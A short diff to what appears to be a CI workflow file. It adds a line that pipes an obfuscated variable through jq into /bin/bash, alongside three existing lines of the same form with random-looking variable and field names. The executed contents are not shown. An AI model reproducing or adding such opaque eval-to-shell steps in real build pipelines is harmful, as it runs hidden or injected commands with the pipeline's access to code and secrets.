@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$by1" | jq -r .cszg464 | /bin/bash
           printf '%s' "$wu4" | jq -r .mbrj2 | /bin/bash
           echo $eoz787 | jq -r .zw8730 | /bin/bash
+          echo $rtqj1 | jq -r .vdwp0 | /bin/bash
 
       - name: Save archive
         if: always()
